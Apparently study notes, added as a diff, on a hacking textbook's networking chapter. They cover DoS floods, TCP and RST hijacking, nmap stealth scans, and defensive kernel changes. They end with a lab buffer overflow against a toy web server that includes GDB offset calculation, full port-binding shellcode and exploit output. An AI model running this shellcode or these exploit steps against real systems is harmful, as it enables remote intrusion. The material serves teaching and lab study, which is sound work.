+17:08:16.478497 IP 130.246.104.88.48221 > 192.168.42.88.22: S
+2069757602:2069757602(0) win 4767
+17:08:16.490908 IP 140.187.48.68.9179 > 192.168.42.88.22: S
+1429854465:1429854465(0) win 2092
+17:08:16.502498 IP 33.172.101.123.44358 > 192.168.42.88.22: S
+1524034954:1524034954(0) win 26970
+15 packets captured
+30 packets received by filter
+0 packets dropped by kernel
+reader@hacking:~/booksrc $ ssh -v 192.168.42.88
+OpenSSH_4.3p2, OpenSSL 0.9.8c 05 Sep 2006
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: Connecting to 192.168.42.88 [192.168.42.88] port 22.
+debug1: connect to address 192.168.42.88 port 22: Connection refused
+ssh: connect to host 192.168.42.88 port 22: Connection refused
+reader@hacking:~/booksrc $
+
+Some OSes (Ex. Linux) usea technique called *syncookies* to try to prevent SYN flood attacks. The TCP stack using syncookies adjusts the initial acknowledgment number for the responding SYN/ACK packet using a value based on host details and time (to prevent replay attacks).
+
+The TCP connections don't actually become active until the final ACk packet for the TCP handshake is checked. If the sequence number doesn't match or the ACk never arrives, a connection is never created. 
+
+This helps prevent spoofed connection attempts, since the ACK packet requires information to be sent to the source address of the initial SYN packet. 
+
+THE PING OF DEATH
+
+According to the specification for ICMP, ICMP echo messages can only have 2^16 or 65536 bytes of data in the data part of the packet. 
+
+The data portion of ICMP packets is commonly overlooked, since the important information is in the header. 
+
+Several OSes crashed if they were sent ICMP echo messages that exceeded the size specified. An ICMP of this size became known as "The Ping of Death". 
+
+It was a very simple hack that existing because no one considered this possibility. 
+
+Modern systems are all patched against this vulnerability. 
+
+However, this is a lesson. New technologies may suffer from similar problems.
+
+Early Bluetooth had a similar ping packet on the L2CAP layer, which is also used to measure the communication time on established links. Many implementations of Bluetooth suffered from the same oversized ping packet problem. 
+
+Bluesmack -> attacking bluetooth this way
+
+TEARDROP
+
+Another crashing DoS attack
+
+Exploited another weakness in several vendors' implementations of IP fragmentation reassembly. 
+
+Usually when a packet is fragmented, the offsets stored in the header will line up to reconstruct the original packet with no overlap. The teardrop attack sent packet fragments with overlapping offsets, which causes implementations that didn't check for this irregular condition to inevitably crash. 
+
+Although this specific attack doesn't work anmore, understanding the concept can reveal problems in other areas. 
+
+Although not limited to DoS, a recent remote exploit in the OpenBSD kernel (which prides itself on security) had to do with with fragmented IPv6 packets. IP version 6 uses more complicated headers and even a different IP address format that IPv4. 
+
+Often the same mistakes made in the past are repeated by early implementations of new products
+
+PING FLOODING
+
+Flooding DoS attacks don't try to necessarily crash a service or resource, but instead try to overload it so it can't respond. Similar attacks can tie up other resources, such as CPU cycles and system processes, but a flooding attack specifically tries to tie up a network resource. 
+
+Ping flood -> simplest form of flooding. 
+
+Goal is to use up the victim's bandwidth so that legitimate traffic can't get through. Attaker sends many large ping packets to the victim which eat awaay at the bandwidth of the victim's network connection.
+
+It's just a battle of bandwidth. 
+
+An attacker with greater bandwidth than the victim can send more data than the victim can receive and therefore deny other legitimate traffic from getting to the victim.
+
+AMPLIFiCATION ATTACKS
+
+Actually clever ways to perform a ping flood without using massive amounts of bandwidth.
+
+Amplification attack -> uses spoofing and broadcast addressing to amplify a single stream of packets by a hundred-fold. 
+
+First, a target amplification system must be found. This is a network that allows communications to the broadcast address and has a relatively high number of active hosts. 
+
+Then the attacker sends large ICMP echo request packets to the broadcast address of the amplification network, with a spoofed source address of the victim's system. The amplifier will broadcast these packets to all the hosts on the amplificatoin network, which will then send corresponding ICMP echo reply packets to the spoofed source address (i.e., to the victim's machine). 
+
+Amplification of traffic allows the attacker to send a relatively small stream of ICMP echo request packets out, which the victim gets swamped with up to a couple hundred times as many ICMP echo reply packets. 
+
+This attack can be done with both ICMP packets and UDP echo packets. 
+
+Techniques are known as *smurf* and *fraggle* attacks respectively.
+
+DISTRIBUTED DoS FLOODING
+
+Distributed DoS (DDoS) attack -> distributed version of a flooding DoS attack. 
+
+Since bandwidth consumption is the goal of a flooding DoS attack, the more bandwidth the attacker is able to work with, the more damage they can do. 
+
+In a DDoS attack, the attacker first compromises a number of other hosts and install daemons on them. 
+
+Systems installed with such software are commonly referred to as bots and make up what is known as a botnet. 
+
+These bots wait patiently until the attacker picks a victim and decides to attack. The attaker uses some sort of a controlling program, and all of the bots simultaneously attack the victim with some form of flooding DoS attack. Not only does the great number of distributed hosts multiply the effect of the flooding, this also makes tracking the attack source much more difficult.
+
+TCP/IP HIJACKING
+
+TCP/IP hijacking -> clevel techinque that uses spoofed packets to take over a connection between a victim and a host machine. Exceptionally useful when the victim uses a one-tim epassword to connect to the host machine. A one-time password can be used to authenticate once and only once, which means that sniffing the authentication is useless for the attacker
+
+Attacker must be on the same network as the victim. By sniffing local network segment, all of the details of open TCp connections can be pulled from the headers. As previously seen, each TCP packet contains a sequence number in its header. This sequence number is incremented with each packet sent to ensure that packets are received in the correct order. 
+
+While sniffing, the attacker has access to the sequence numbers for a connection between a victim (system A in the following illustration) and a host machine (system B). Then the attaacker sends a spoofed packet from the victim's IP address to the host machine, using the sniffed sequence number to provide the proper acknowledgement number, as shown here. 
+
+pg 258
+
+The host machine will receive the spoofed packet with the correct acknowledgement number and will have no reason to believe it didn't come from the victim machine
+
+RST HIJACKING
+
+RST Hijacking -> a very simple form of TCP/IP hijacking that involved injecting an authentic looking reset (RST) packet. If source is spoofed, and the acknowledgement number is correct, the receiving side will believe that the source actually sent the rest packet, and the connection will be reset. 
+
+Imagine program to perform this attack on a target IP.
+
+At high level, it would sniff using libpcap, then inject RST packets using libnet. 
+
+Such a program doesn't need to look at every packet but only at established TCP connections to the target IP. 
+Many other programs that use libpcap also don't need to look at every single packet, so libpcap provides a way to tell the kernel to only send certain packets that match a filter. 
+
+This filter, knwon as a Berkely Packet Filter (BPF) is very similar to a program. For example, the filter rule to filter for a destination IP of 192.168.42.88 is "dst host 192.168.42.88". Like a program, this rule consists of keyword and must be compiled before it's actually sent to the kernel. 
+
+The tcpdump program uses BPFs to filter what it captures; it also provides a mode to dump the filter program
+
+reader@hacking:~/booksrc $ sudo tcpdump -d "dst host 192.168.42.88"
+(000) ldh	[12]
+(001) jeq	#0x800			jt 2	jf 4
+(002) ld	[30]
+(003) jeq	#0xc0a82a58		jt 8	jf 9
+(004) jeq	#0x806			jt 6	jf 5
+(005) jeq	#0x8035			jt 6	jf 9
+(006) ld	[38]
+(007) jeq	#0xc0a82a58		jt 8	jf 9
+(008) ret	#96
+(009) ret	#0
+reader@hacking:~/booksrc $ sudo tcpdump -ddd "dst host 192.168.42.88"
+10
+40 0 0 12
+21 0 2 2048
+32 0 0 30
+21 4 5 3232246360
+21 1 0 2054
+21 0 3 32821
+32 0 0 38
+21 0 1 3232246360
+6 0 0 96
+6 0 0 0
+reader@hacking:~/booksrc $ 
+
+After the filter rule is compiled, it can be passed to the kernel for filtering
+
+Filtering for established connections is a bit more complicated
+
+All established connections will have the ACK flag set, so this is what we should look for. 
+
+The TCP flags are found in the 13th octet of the TCP header. The flags are found in the following order, from left to right: URG, ACK, PSH, RST, SYN, and FIN. 
+
+This means that if the ACK flag is turned on, the 13th octet would be 00010000 in binary, which is 16 in decimal.
+
+If both SYN and ACK are turned on, the 13th octet would be 00010010 in binary, which is 18 in decimal
+
+In order to create filter that matches when the ACk flag is turned on without caring about any of the other bits, the bitwise AND operator is used. 
+
+ANDing 00010010 and 00010000 will produce 00010000.
+
+Means a filter of tcp[13] & 16 == 16 will match the packets where the ACk flag is turned on, regardless of state of remaining flags. 
+
+This filter rule can be rewritten using named values and inverted logic:
+tcp[tcpflags] & tcp-ack != 0. 
+
+This is easier to read but still provides the same result. This rule can be combined with the previous destination IP rule using and logic; the rule rule shown below:
+
+reader@hacking:~/booksrc $ sudo tcpdump -nl "tcp[tcpflags] & tcp-ack != 0 and dst host
+192.168.42.88"
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes
+10:19:47.567378 IP 192.168.42.72.40238 > 192.168.42.88.22: . ack 2777534975 win 92
+<nop,nop,timestamp 85838571 0>
+10:19:47.770276 IP 192.168.42.72.40238 > 192.168.42.88.22: . ack 22 win 92 <nop,nop,timestamp
+85838621 29399>
+10:19:47.770322 IP 192.168.42.72.40238 > 192.168.42.88.22: P 0:20(20) ack 22 win 92
+<nop,nop,timestamp 85838621 29399>
+10:19:47.771536 IP 192.168.42.72.40238 > 192.168.42.88.22: P 20:732(712) ack 766 win 115
+<nop,nop,timestamp 85838622 29399>
+10:19:47.918866 IP 192.168.42.72.40238 > 192.168.42.88.22: P 732:756(24) ack 766 win 115
+<nop,nop,timestamp 85838659 29402>
+
+A simlar rule is used in the following program to filter the packets libpcap sniffs. When program gets a packet, the header information is used to spoof a RST packet. 
+
+rst_hijack.c
+
+In beginning, a data_pass structure is defined, which is used to pass data through the libpcap callback. 
+
+libnet is used to open a raw socket interface ad to allocate packet memory. The file descriptor for the raw socket and a pointer to the packet memory will be needed in the callback function, so this critical libnet data is stored in its own structure. 
+
+The final argument to the pcap_loop call is user pointer, which is passed directly to the callback function. By passing a pointer to the critical_libnet_data structure, the callback function will have access to everything in this structure. Also the snap length value used in pcap_open_live() has been reduced from 4096 to 128 since the information needed from the packet is just in the headers
+
+The set_packet_filter() function compiles and sets the BPF to only accept packets from established connections to the target IP.
+
+The caught_packet() callback function spoofs the RST packets. 
+
+First the critical libnet data is retrieved, and pointers to the IP and TCP headers are set using the structures included with libnet. We could use created structures from hacking-network.h but the libnet structures are already there and compensate for the host's byte ordering. The spoofed RST packet uses the sniffed source address as the destination and vice versa. The sniffed sequence number is used as the spoofed packet's acknowledgment number, since that is what is expected.
+
+reader@hacking:~/booksrc $ gcc $(libnet-config --defines) -o rst_hijack rst_hijack.c -lnet -lpcap
+reader@hacking:~/booksrc $ sudo ./rst_hijack 192.168.42.88
+DEBUG: filter string is 'tcp[tcpflags] & tcp-ack != 0 and dst host 192.168.42.88'
+Resetting all TCP connections to 192.168.42.88 on eth0
+resetting TCP connection from 192.168.42.72:47783 <---> 192.168.42.88:22
+
+CONTINUED HIJACKING
+
+The spoofed packet doens't need to be an RST packet. 
+
+This attack becomes more interesting when the spoof packet contains data. 
+
+The host machine receives the spoofed packet, increments the sequence number, and responds to the victim's IP. Since the victim's machine doesn't know about the spoofed packet, the host machine's response has an incorrect sequence number, so the victim ignores that response packet. And since the victim's machine ifnored the host machine's response packet, the victim's sequence number count is off. 
+
+Therefore, any packet the victim tries to send to the host machine will have an incorrect sequence number as well, causing the host machine to ignore it.
+
+In this case, both legitimate sides of the connection have incorrect sequence numbers, resulkting in a desynchronized state. 
+
+And since attacker sent out the first spoofed packet that causes all this choas, it can keep track of sequence numbers and continue spoofing packets from the victim's IP address to the host machine. 
+
+This lets the attacker continue communicating with the host machine while the victim's connection hangs.
+
+PORT SCANNING
+
+Port scanning -> a way to figuring out which ports are listening and accepting connections. 
+
+Since most services run on standard, documented ports, this information can be used to determine which services are running. 
+
+The simplest form of porm scanning involes trying to open TCP connections to very possible port on the target system. 
+
+While this is effective, it is also noisy and detectable. 
+
+Also when connections are established, services will normally log the IP address. 
+
+To avoid this, several clever techinques have been invented.
+
+nmap -> port scanning tool implements all the following port-scanning techniques. 
+
+STEALTH SYN SCAN
+
+Syn scan -> aka. Half Open Scan. Because it doesn't actually open a full TCP connection
+
+A syn scan doesn't complete the full TCP handshake so a full connectoin is never opened. Instead, only the initial SYN packet is sent, and the response is examined. If a SYN/ACK packet is received in response, that port must be accepting connections. This is recorded, and an RST packet is sent to tear down the connection to prevent the service from accidentally being DoSed.
+
+Using nmap, a SYN scan can be performed using the command-line option -sS. Program must be run as root, since the program isn't using standard sockets and needs raw network access
+
+reader@hacking:~/booksrc $ sudo nmap -sS 192.168.42.72
+Starting Nmap 4.20 ( http://insecure.org ) at 2007-05-29 09:19 PDT
+Interesting ports on 192.168.42.72:
+Not shown: 1696 closed ports
+PORT
+STATE SERVICE
+22/tcp
+open ssh
+Nmap finished: 1 IP address (1 host up) scanned in 0.094 seconds
+
+FIN, X-MAS, AND NULL SCANS
+
+In response to SYN scanning, new tools to detect and log half-open connections were created. So yet another collection of techniques for stealth port scanning evolved: FIN, X-mas, and Null Scans
+
+These all involve sending a nonsensical packet to every port on the targeted system. If a port is listening, these packets just get ignored. However, it the port is closed and the implementation follows protocol (RFC 793), an RST packet will be sent. This difference can be used to detect which ports are accepting connections, without actually opening any connections
+
+The FIN scan sends a FIN packet, the X-mas scan sends a packet with FIN, URG, and PUSh turned on (so named because the flags are lit up like a xmas tree), and the Null scan sends a packet with no TCP flags set.
+
+While these types of scans are stealthier, they can also be unreliable. 
+
+For instance, Microsoft's implementation of TCP doesn't send RST packets like it should, making this form of scanning ineffective.
+
+Using nmap, FIN, xmas, and NULL scans can be performed using the command line options -sF, -sX, -sN respectively.
+
+SPOOFING DECOYS
+
+Another way to avoid detection is to hide among several decoys. 
+
+This technique simply spoofs connections from various decoy IP addresse in between each real port-scanning connection. 
+
+The responses from the spoofed connections aren't needed, since they are simply misleads.
+
+However, the spoofed decoy addresses must use real IP addresses of live hosts; otherwise the target may be accidentally SYN flooded.
+
+Decoys can be specified in nmap with the -D command line option.
+
+This simple nmap command scans the IP 192.168.42.72, using 192.168.42.10 and 192.168.42.11 as decoys
+
+reader@hacking:~/booksrc $ sudo nmap -D 192.168.42.10,192.168.42.11 192.168.42.72
+
+IDLE SCANNING
+
+Idle Scanning -> a way to scan a target using spoofed packets from an idle host, by observing changes in the idle host. 
+
+The attacker needs to find a usable idle host that is not sendinf or receiving any other network traffic and that has a TCP implementation that produces predictable IP IDs that change by a known increment with each packet. IP IDs are meant to be unique per packet per session, and they are commonly incremented by a fixed amount. 
+
+Predictable IP IDs have never really been considered a security risk, and idle scanning takes advantage of this misconception. 
+
+Newer OSes, such as recent Linux kernel, OpenBSD, and Windows Vista, randomize the IP ID, but older OSes and hardware (such as printers) typically do not. 
+
+First, the attacker gets the current IP ID of the idle host by contacting it with a SYN packet or an unsolicited SYN/ACK packet and observing the IP ID of the response. By repeating the process a few more times, the increment applied to the IP ID with each packet can be determined. 
+
+Then, attacker sends a spoofed SYN packet with the idle host's IPD address to a port on the target machine. One of two things will happen, depending on whether that port on the victim machine is listening:
+
+1. If that port is listening, a SYN/ACK packet will be sent back to the idle host. But since the idle host didn't actually send out the initial SYN packet, this response appears to be unsolicited to the idle host, and it response by sending back an RST packet.
+
+2. If that port isn't listening, the atarget machine doesn't send a SYN/ACK packet back to the idle host, so the idle host doesn't respond.
+
+At this point, the attacker contacts the idle host again to determine how much the IP ID has incremented. 
+
+If it has only incremented by one interval, no other packets were sent out by the idle host between the two checks. This implies that the port on the target machine is closed. 
+
+If the IP ID has incremented by two intervals, one packet, presumably an RST packet, was sent out by the idle machine between the checks. This implies that hte port on the target machine is open
+
+Steps illustrated on pg. 266
+
+If idle host isn't truly idle, results will be skewed. 
+
+If there is light traffic on the idle-host, multiple packets can be sent for each port. If 20 packets are sent, then a change of 20 incremental steps should be an indication of an open port, and none, or a closed port. Even if there is light traffic, such as one or two non-scan-related packets sent by the idle host, this difference is large enough that it can still be detected. 
+
+If this technique is used properly on an idle host that doesn't have any logging capabilities, the attacker can scan any target without ever revealing his/her IP address.
+
+After finding a suitable idle host, this type of scannning can be done with nmap using the -sI command line option followed by the idle host's address
+
+reader@hacking:~/booksrc $ sudo nmap -sI idlehost.com 192.168.42.7
+
+PROACTIVE DEFENSE
+
+Port scans are often used to profile systems before they are attacked. Knowing what ports are open allows an attacker to determine which services can be attacked. 
+
+Many IDs ffer methods to detect port scans, but by then the information has already been leaked. 
+
+First of all, the FIN, Null, and X-mas scans can be prevented by a simple kernel modification. If kekrnel never sends reset packets, these scans will turn up nothing. 
+
+Following output uses grep to find the kernel code responsible for sending reset packets
+
+reader@hacking:~/booksrc $ grep -n -A 20 "void.*send_reset" /usr/src/linux/net/ipv4/tcp_ipv4.c
+547:static void tcp_v4_send_reset(struct sock *sk, struct sk_buff *skb)
+548-{
+549-
+struct tcphdr *th = skb->h.th;
+550-
+struct {
+551-
+struct tcphdr th;
+552-#ifdef CONFIG_TCP_MD5SIG
+553-
+__be32 opt[(TCPOLEN_MD5SIG_ALIGNED >> 2)];
+554-#endif
+555-
+} rep;
+556-
+struct ip_reply_arg arg;
+557-#ifdef CONFIG_TCP_MD5SIG
+558-
+struct tcp_md5sig_key *key;
+559-#endif
+560-
+return; // Modification: Never send RST, always return.
+561-
+/* Never send a reset in response to a reset. */
+562-
+if (th->rst)
+563-
+return;
+564-
+565-
+if (((struct rtable *)skb->dst)->rt_type != RTN_LOCAL)
+566-
+return;
+567-
+reader@hacking:~/booksrc $
+
+By adding the return command (shown in bold), the tcp_v4_send_reset() kernel function will simply return instead of doing anything. After kernel is recompiled, the resulting kernel won't send out reset packets, avoiding information leakage. 
+
+FIN Scan Before The Kernel Modification
+
+matrix@euclid:~ $ sudo nmap -T5 -sF 192.168.42.72
+Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2007-03-17 16:58 PDT
+Interesting ports on 192.168.42.72:
+Not shown: 1678 closed ports
+PORT
+STATE
+SERVICE
+22/tcp open|filtered ssh
+80/tcp open|filtered http
+MAC Address: 00:01:6C:EB:1D:50 (Foxconn)
+Nmap finished: 1 IP address (1 host up) scanned in 1.462 seconds
+matrix@euclid:~ $
+
+FIN Scan After The Kernel Modification
+
+matrix@euclid:~ $ sudo nmap -T5 -sF 192.168.42.72
+Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2007-03-17 16:58 PDT
+Interesting ports on 192.168.42.72:
+Not shown: 1678 closed ports
+PORT
+STATE
+SERVICE
+MAC Address: 00:01:6C:EB:1D:50 (Foxconn)
+Nmap finished: 1 IP address (1 host up) scanned in 1.462 seconds
+matrix@euclid:~ $
+
+This works fine for scans that rely on RST packets, but preventing information leakage with SYN scans and full-connect scans is a bit more difficult. 
+
+In order to maintain functionality, open ports have to respond with SYN/ACK packets -- there is no way around that. But if all the closed ports also responded with SYN/ACK packets, the amount of useful information an attacker could retrieve from port scans would be minimized. 
+
+Simply opening every port would cause a major performance hit, though, which isn't desirable. 
+
+Ideally this should all be done without using a TCP stack. 
+
+Following program does exactly that.
+
+It is a modification of the rst_hijack.c program, using a more complex BPF string to filter only SYN packets destined for closed ports. The callback function spoofs a legitimate looking SYN/ACK response to any SYN packet that makes it through the BPF. This will flood port scanners with a sea of false positives, which will hide legitimate ports. 
+
+shroud.c
+
+When the program is compiled and executed, it will shroud the IP address given as the first argument, with the exception of a list of existing ports provided as the remaining arguments
+
+reader@hacking:~/booksrc $ gcc $(libnet-config --defines) -o shroud shroud.c -lnet -lpcap
+reader@hacking:~/booksrc $ sudo ./shroud 192.168.42.72 22 80
+DEBUG: filter string is 'dst host 192.168.42.72 and tcp[tcpflags] & tcp-syn != 0 and
+tcp[tcpflags] & tcp-ack = 0 and not (dst port 22 or dst port 80)'
+
+While shroud is running, any port scanning attempts will show every port to be open
+
+The only service actually running is ssh on port 22, but it is hidden in a sea of false positives. 
+
+A dedicated attacker could simply telnet to every port to check the banners, but this technique could easily be expanded to spoof banners also
+
+REACH AND HACK SOMEONE
+
+Network programming tends to move many chunks of memory around and is heavy in typecasting.
+
+Mistakes thrive in this kind of chaos. 
+
+One such vulnerability existed in code in this chapter
+
+hacking-network.h
+
+recv_line() -> no code to limit the length. Means received bytes can overflow if they exceed the dest_buffer size. 
+
+The tinyweb server program and any other programs that use this function are vulnerable to attack.
+
+ANALYSIS WITH GDB
+
+To exploit the vulnerability in the tinyweb.c program, we need to send packets that will strategically overwrite the return address.
+
+First, need to know the offset from the start of a buffer we contro. to the stored return address.
+
+Using GDB, we can analyze the compiled program to find this; HOWEVER, there are some subtle details that can cause tricky problems. 
+
+For example, the program requires root privileges, so the debugger must be run as root. 
+
+BUT using sudo or running with root's environment will change the stack, meaning the addresses seen in the debugger's run of the binary won't match the addresses when it's running normally. 
+
+There are other slight differences that can shift memory around in the debugger like this, creating inconsistencies that can be maddening to track down. According to the debugger, everything will look like it should work; however, the xploit fails when run outside the debugger, since the addresses are different. 
+
+One elegant solution to this probelm is to attach to the process after it's already running. 
+
+In output below, GDB is used to attach to an already-running tinyweb process that was started in another terminal. The source is recompiled using the -g option to include debugging symbols that GDB can apply to the running process.
+
+reader@hacking:~/booksrc $ ps aux | grep tinyweb
+root	13019 0.0 0.0	1504	344 pts/0	S+	20:25 0:00 ./tinyweb
+reader 13104 0.0 0.0	2880	748 pts/2	R+	20:27 0:00 grep tinyweb
+reader@hacking:~/booksrc $ gcc -g tinyweb.c
+reader@hacking:~/booksrc $ sudo gdb -q --pid=13019 --symbols=./a.out
+Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
+Attaching to process 13019
+/cow/home/reader/booksrc/tinyweb: No such file or directory.
+A program is being debugged already. Kill it? (y or n) n
+Program not killed.
+(gdb) bt
+#0 0xb7fe77f2 in ?? ()
+#1 0xb7f691e1 in ?? ()
+#2 0x08048ccf in main () at tinyweb.c:44
+(gdb) list 44
+39
+if (listen(sockfd, 20) == -1)
+40
+fatal("listening on socket");
+41
+42
+while(1) {
+// Accept loop
+43
+sin_size = sizeof(struct sockaddr_in);
+44
+new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
+45
+if(new_sockfd == -1)
+46
+fatal("accepting connection");
+47
+48
+handle_connection(new_sockfd, &client_addr);
+(gdb) list handle_connection
+53
+/* This function handles the connection on the passed socket from the
+54
+* passed client address. The connection is processed as a web request
+55
+* and this function replies over the connected socket. Finally, the
+56
+* passed socket is closed at the end of the function.
+57
+*/
+58
+void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr) {
+59
+unsigned char *ptr, request[500], resource[500];
+60
+int fd, length;
+61
+62
+length = recv_line(sockfd, request);
+(gdb) break 62
+Breakpoint 1 at 0x8048d02: file tinyweb.c, line 62.
+(gdb) cont
+Continuing.
+
+After attaching to the running process, a stack backtrace shows the program is currently running in main(), waiting for a connection. After setting a breakpoint at the first recv_line() call on line 62(1), the program is allowed to cotinue. 
+
+At this point, the program's execution must be advanced by making a web request using wget in another terminal or a browser. Then the breakpoint in handle_connection() will be hit. 
+
+Breakpoint 2, handle_connection (sockfd=4, client_addr_ptr=0xbffff810) at tinyweb.c:62
+62
+length = recv_line(sockfd, request);
+(gdb) x/x request
+0xbffff5c0:
+0x00000000
+(gdb) bt
+#0 handle_connection (sockfd=4, client_addr_ptr=0xbffff810) at tinyweb.c:62
+#1 0x08048cf6 in main () at tinyweb.c:48
+(gdb) x/16xw request+500
+0xbffff7b4:	0xb7fd5ff4	0xb8000ce0	0x00000000	0xbffff848
+0xbffff7c4:	0xb7ff9300	0xb7fd5ff4	0xbffff7e0	0xb7f691c0
+0xbffff7d4:	0xb7fd5ff4	0xbffff848	0x08048cf6	0x00000004
+0xbffff7e4:	0xbffff810	0xbffff80c	0xbffff834	0x00000004
+(gdb) x/x 0xbffff7d4+8
+0xbffff7dc:
+0x08048cf6
+(gdb) p 0xbffff7dc - 0xbffff5c0
+$1 = 540
+(gdb) p /x 0xbffff5c0 + 200
+$2 = 0xbffff688
+(gdb) quit
+The program is running. Quit anyway (and detach it)? (y or n) y
+Detaching from program: , process 13019
+reader@hacking:~/booksrc $
+
+At the breakpoint, the request buffer begins at 0xbfffff5co
+
+The bt command's stack backtrace shows that the return address from handle_connection() is 0x08048cf6. Since we know how the local variables are generally laid out on the stack, we know the request buffer is near the end of the frame. This means the stored return address should be on the stack somewhere near the end of this 500-byte buffer. 
+
+Since we already know the general area to look, a wuick inspection shows the stored return address is at 0xbffff7dc (2). 
+
+A little math shows the stored return address is 540 bytes from the start of the request buffer. 
+
+However, there are a few bytes near the beginning of the buffer that might be mangled by the rest of the function. 
+
+Remember, we don't gain control of the program until the function returns. 
+
+To account for this, it's best to just avoid the beginning of the buffer. Skipping the first 200 bytes should be safe, while leaving plenty of space for shellcode in the remaining 300 bytes. This means 0xbffff688 is the target return address.
+
+ALMOST ONLY COUNTS WITH HAND GRENADES
+
+Following exploit for tinyweb program uses the offset and return address overwrite values calculated with GDB. It fils the exploit buffer with null bytes so anything written into it will automatically be null-terminated. Then it fills the first 540 bytes with NOP instructions. This builds the NOP sled and fills the buffer up to the return address overwrite location. Then the entire string is terminated with the '\r\n' line terminator.
+
+tinyweb_exploit.c
+
+When this program is compiled, it can remotely exploit hosts running the tinyweb program, tricking them into running the shellcode. The exploit also dumps out the bytes of the xploit buffer before it sends it. 
+
+In output, the tinyweb program is run in a different terminal, and the exploit is tested against it.
+
+Output shows the attacker's terminal
+
+pg 276-277
+
+Back on the terminal running the tinyweb program, the output shows the exploit buffer was received and the shellcode is executed. 
+
+This will provide a rootshell, but only for the console running the server. Unfortunately, we aren't at that console, so this won't do us any good.
+
+Only runs shell.
+
+Once control of the program's execution pointer is taken, the injected shellcode can do anything. There are many different types of shellcode that can be used in different situations (or payloads). Even though not all shellcode spawns a shell, it's still commonly called shellcode.
+
+PORT BINDING SHELLCODE
+
+When exploiting a remote program, spawning a shell locally is pointless.
+
+Port-binding shellcode -> listens for a TCP connection on a certain port and serves up the shell remotely.
+
+Assuming you already have port-binding shellcode ready, using it is simply a matter of replacing the shellcode bytes defined in the exploit. 
+
+Port binding shellcode is included in the LiveCD that will bind to port 31337. 
+
+reader@hacking:~/booksrc $ wc -c portbinding_shellcode
+92 portbinding_shellcode
+reader@hacking:~/booksrc $ hexdump -C portbinding_shellcode
+00000000 6a 66 58 99 31 db 43 52 6a 01 6a 02 89 e1 cd 80 |jfX.1.CRj.j.....|
+00000010 96 6a 66 58 43 52 66 68 7a 69 66 53 89 e1 6a 10 |.jfXCRfhzifS..j.|
+00000020 51 56 89 e1 cd 80 b0 66 43 43 53 56 89 e1 cd 80 |QV.....fCCSV....|
+00000030 b0 66 43 52 52 56 89 e1 cd 80 93 6a 02 59 b0 3f |.fCRRV.....j.Y.?|
+00000040 cd 80 49 79 f9 b0 0b 52 68 2f 2f 73 68 68 2f 62 |..Iy...Rh//shh/b|
+00000050 69 6e 89 e3 52 89 e2 53 89 e1 cd 80
+|in..R..S....|
+0000005c
+reader@hacking:~/booksrc $ od -tx1 portbinding_shellcode | cut -c8-80 | sed -e 's/ /\\x/g'
+\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80
+\x96\x6a\x66\x58\x43\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10
+\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80
+\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f
+\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62
+\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80
+reader@hacking:~/booksrc $
+
+After some quick formatting, these bytes are swapped into the shellcode bytes of the tinyweb_exploit.c program, resulting in tinyweb_explot2.c 
+
+New shellcode is below:
+
+char shellcode[]=
+"\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80"
+"\x96\x6a\x66\x58\x43\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10"
+"\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80"
+"\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f"
+"\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
+"\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";
+// Port-binding shellcode on port 31337
+
+When this exploit is compiled and run against a host runing tinyweb server, the shellcode listens on port 31337 for a TCP connection.
+
+In output below, a program called nc is used to connect to the shell
+
+nc -> netcat. Works like cat but over the network. 
+
+Can't use telnet to connect since it automatically terminates all outgoing lines with '\r\n'
+
+The -vv command line option to netcat makes it verbose
+
+reader@hacking:~/booksrc $ gcc tinyweb_exploit2.c
+reader@hacking:~/booksrc $ ./a.out 127.0.0.1
+Exploit buffer:
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................
+90 90 90 90 90 90 90 90 90 90 90 90 6a 66 58 99 | ............jfX.
